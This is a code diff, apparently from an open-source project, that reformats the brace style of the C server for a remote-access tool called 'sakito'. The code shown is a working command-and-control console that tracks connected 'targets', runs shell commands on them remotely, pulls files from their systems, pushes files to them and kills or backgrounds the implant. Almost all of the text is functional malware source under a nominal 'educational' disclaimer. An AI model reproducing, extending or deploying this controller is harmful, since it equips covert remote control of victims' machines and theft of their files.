@@ -28,7 +28,8 @@ Use this code educationally/legally.
 
 #define PORT 4443
 
-void add_client(Server_map* const s_map, char* const host, const SOCKET client_socket) {
+void add_client(Server_map* const s_map, char* const host, const SOCKET client_socket) 
+{
 	mutex_lock(s_map);
 
 	if (s_map->clients_sz == s_map->clients_alloc)
@@ -43,7 +44,8 @@ void add_client(Server_map* const s_map, char* const host, const SOCKET client_s
 }
 
 // Function to bind socket to specified port.
-void bind_socket(const SOCKET listen_socket) {
+void bind_socket(const SOCKET listen_socket) 
+{
 	// Create sockaddr_in structure.
 	struct sockaddr_in sin;
 
@@ -61,13 +63,15 @@ void bind_socket(const SOCKET listen_socket) {
 		terminate_server(listen_socket, "An error occured while placing the socket in listening state");
 }
 
-void sakito_accept_conns(Server_map* const s_map) {
+void sakito_accept_conns(Server_map* const s_map) 
+{
 	// Assign member values to connection map object/structure.
 	s_map->clients_alloc = MEM_CHUNK;
 	s_map->clients_sz = 0;
 	s_map->clients = malloc(s_map->clients_alloc * sizeof(Conn));
 
-	while (1) {
+	while (1) 
+	{
 		struct sockaddr_in client;
 		int c_size = sizeof(client);
 
@@ -80,10 +84,12 @@ void sakito_accept_conns(Server_map* const s_map) {
 		char host[NI_MAXHOST] = { 0 };
 		char service[NI_MAXHOST] = { 0 };
 
-		if (getnameinfo((struct sockaddr*)&client, c_size, host, NI_MAXHOST, service, NI_MAXSERV, 0) == 0) {
+		if (getnameinfo((struct sockaddr*)&client, c_size, host, NI_MAXHOST, service, NI_MAXSERV, 0) == 0) 
+		{
 			printf("%s connected on port %s\n", host, service);
 		}
-		else {
+		else 
+		{
 			inet_ntop(AF_INET, &client.sin_addr, host, NI_MAXHOST);
 			printf("%s connected on port %hu\n", host, ntohs(client.sin_port));
 		}
@@ -93,31 +99,37 @@ void sakito_accept_conns(Server_map* const s_map) {
 	}
 }
 
-void host_chdir(Server_map* const s_map) {
+void host_chdir(Server_map* const s_map) 
+{
 	if (chdir(s_map->buf+3) == FAILURE) 
 		if (errno) 
 			fprintf(stderr, "%s: %s\n\n", s_map->buf+3, strerror(errno));
 }
 
 // Function to list/print all available connections to stdout.
-void list_connections(Server_map* const s_map) {
+void list_connections(Server_map* const s_map) 
+{
 	printf("\n\n---------------------------\n");
 	printf("---  C0NNECTED TARGETS  ---\n");
 	printf("--     Hostname: ID      --\n");
 	printf("---------------------------\n\n");
 
-	if (s_map->clients_sz) {
+	if (s_map->clients_sz) 
+	{
 		for (size_t i = 0; i < s_map->clients_sz; i++)
 			printf("%s: %lu\n", s_map->clients[i].host, i);
 		printf("\n\n");
 	}
-	else {
+	else 
+	{
+
 		printf("No connected targets available.\n\n\n");
 	}
 }
 
 // Function send change directory command to client.
-int client_chdir(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
+int client_chdir(char* const buf, const size_t cmd_len, const SOCKET client_socket) 
+{
 	// '1' is the command code for changing directory.
 	buf[3] = '1';
 	
@@ -136,7 +148,8 @@ int client_chdir(char* const buf, const size_t cmd_len, const SOCKET client_sock
 }
 
 // Function to terminate/kill client.
-int terminate_client(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
+int terminate_client(char* const buf, const size_t cmd_len, const SOCKET client_socket) 
+{
 	// '2' is the command code for terminating/killing the process on the client.
 	sakito_tcp_send(client_socket, "2", cmd_len);
 
@@ -144,7 +157,8 @@ int terminate_client(char* const buf, const size_t cmd_len, const SOCKET client_
 }
 
 // Function to receive file from target machine (TCP file transfer).
-int recv_file(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
+int recv_file(char* const buf, const size_t cmd_len, const SOCKET client_socket) 
+{
 	// '4' is the command code for downloading a file from the client's file-system.
 	buf[9] = '4';
 
@@ -162,7 +176,8 @@ int recv_file(char* const buf, const size_t cmd_len, const SOCKET client_socket)
 	// Initialize i_result to true/1
 	int i_result;
 
-	if (f_size != FAILURE) {
+	if (f_size != FAILURE) 
+	{
 		// Open the file.
 		s_file file = sakito_open_file(buf+10, WRITE);
 		if (f_size > 0)
@@ -171,7 +186,9 @@ int recv_file(char* const buf, const size_t cmd_len, const SOCKET client_socket)
 		if (file != INVALID_FILE)
 			sakito_close_file(file);
 	}
-	else {
+	else 
+	{
+
 		puts("The client's system cannot find the file specified.\n");
 	}
  
@@ -183,12 +200,14 @@ int recv_file(char* const buf, const size_t cmd_len, const SOCKET client_socket)
 }
 
 // Function to upload file to target machine (TCP file transfer).
-int send_file(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
+int send_file(char* const buf, const size_t cmd_len, const SOCKET client_socket) 
+{
 	// Open file.
 	s_file file = sakito_open_file(buf+8, READ);
  
 	// If the file exists or permission denied:
-	if (file == INVALID_FILE) {
+	if (file == INVALID_FILE) 
+	{
 		fprintf(stderr, "upload: cannot access: '%s': %s\n\n", buf+8, strerror(errno));
 
 		// Send SERVER_ERROR/'6' control code to client to force client to re-receive command.
@@ -222,7 +241,8 @@ int send_file(char* const buf, const size_t cmd_len, const SOCKET client_socket)
 }
 
 // Function to terminate/kill client.
-int background_client(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
+int background_client(char* const buf, const size_t cmd_len, const SOCKET client_socket) 
+{
 	// '5' is the command code for backgrounding the client.
 	if (sakito_tcp_send(client_socket, "5", 1) < 1)
 		return SOCKET_ERROR;
@@ -231,7 +251,8 @@ int background_client(char* const buf, const size_t cmd_len, const SOCKET client
 }
 
 // Function to send command to client to be executed via CreateProcess() and receive output.
-int client_exec(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
+int client_exec(char* const buf, const size_t cmd_len, const SOCKET client_socket) 
+{
  	buf[0] = '0';
 	// Send command to server.
 	if (sakito_tcp_send(client_socket, buf, cmd_len) < 1)
@@ -240,7 +261,8 @@ int client_exec(char* const buf, const size_t cmd_len, const SOCKET client_socke
 	memset(buf, '\0', BUFLEN);
 
 	// Receive command output stream and write output chunks to stdout.
-	while (1) {
+	while (1) 
+	{
 		if (sakito_tcp_recv(client_socket, buf, sizeof(uint32_t)) < 1)
 			return SOCKET_ERROR;
 
@@ -252,7 +274,8 @@ int client_exec(char* const buf, const size_t cmd_len, const SOCKET client_socke
 		if (sakito_tcp_recv(client_socket, buf, chunk_size) < 1)
 			return SOCKET_ERROR;
 
-		if (write_stdout(buf, chunk_size) == FAILURE) {
+		if (write_stdout(buf, chunk_size) == FAILURE) 
+		{
 			fprintf(stderr, "Error calling WriteFile in client_exec() function: %s\n\n", strerror(errno));
 			return FAILURE;
 		}
@@ -264,11 +287,14 @@ int client_exec(char* const buf, const size_t cmd_len, const SOCKET client_socke
 	return SUCCESS;
 }
 
-void resize_conns(Server_map* const s_map, int client_id) {
+void resize_conns(Server_map* const s_map, int client_id) 
+{
 	// If there's more than one connection: resize the clients structure member values.
-	if (s_map->clients_sz > 1) {
+	if (s_map->clients_sz > 1) 
+	{
 		int max_index = s_map->clients_sz-1;
-		for (size_t i = client_id; i < max_index; i++) {
+		for (size_t i = client_id; i < max_index; i++) 
+		{
 			s_map->clients[i].sock = s_map->clients[i + 1].sock;
 			s_map->clients[i].host = s_map->clients[i + 1].host;
 		}
@@ -280,7 +306,8 @@ void resize_conns(Server_map* const s_map, int client_id) {
 }
 
 // Function to resize s_map array/remove and close connection.
-void delete_client(Server_map* const s_map, const int client_id) {
+void delete_client(Server_map* const s_map, const int client_id) 
+{
 	mutex_lock(s_map);
 
 	// If the file descriptor is open: close it.
@@ -295,10 +322,12 @@ void delete_client(Server_map* const s_map, const int client_id) {
 }
 
 // Function to parse interactive input and send to specified client.
-void interact(Server_map* const s_map) {
+void interact(Server_map* const s_map) 
+{
 	int client_id = validate_id(s_map);
 
-	if (client_id == FAILURE) {
+	if (client_id == FAILURE) 
+	{
 		puts("Invalid client identifier.");
 		return;
 	}
@@ -307,7 +336,8 @@ void interact(Server_map* const s_map) {
 	int i_result = sakito_tcp_send(s_map->clients[client_id].sock, INIT_CONN, 1);
 
 	// Receive and parse input/send commands to client.
-	while (i_result > 0) {
+	while (i_result > 0) 
+	{
 		// Receive current working directory.
 		if (sakito_tcp_recv(s_map->clients[client_id].sock, s_map->buf, BUFLEN) < 1)
 			break;
@@ -321,7 +351,7 @@ void interact(Server_map* const s_map) {
 		const char commands[5][11] = { "cd ", "exit", "upload ", "download ", "background" };
 
 		// Function pointer array of each c2 command.
-		void* func_array[5] = { &client_chdir, &terminate_client, &send_file, &recv_file, &background_client};
+		void* func_array[5] = { &client_chdir, &terminate_client, &send_file, &recv_file, &background_client };
 
 		// Parse and execute command function.
 		size_t cmd_len = 0;
@@ -342,9 +372,11 @@ void interact(Server_map* const s_map) {
 	delete_client(s_map, client_id);
 }
 
-void sakito_console(Server_map* const s_map) {
+void sakito_console(Server_map* const s_map) 
+{
 	// Saktio console loop.
-	while (1) {
+	while (1) 
+	{
 		get_cwd(s_map->buf);
 		printf(CONSOLE_FSTR, s_map->buf);
 
@@ -355,7 +387,7 @@ void sakito_console(Server_map* const s_map) {
 		const char commands[4][11] = { "cd ", "exit", "list", "interact " };
 
 		// Function pointer array of each c2 command.
-		void* func_array[4] = { &host_chdir, &terminate_console, &list_connections, &interact};
+		void* func_array[4] = { &host_chdir, &terminate_console, &list_connections, &interact };
 
 		// Parse and execute command function.
 		size_t cmd_len = 0;
@@ -373,7 +405,8 @@ void sakito_console(Server_map* const s_map) {
 
 
 // Main function for parsing console input and calling sakito-console functions.
-int main(void) {
+int main(void) 
+{
 	// Instantiate a Server_map structure.
 	Server_map s_map;
 
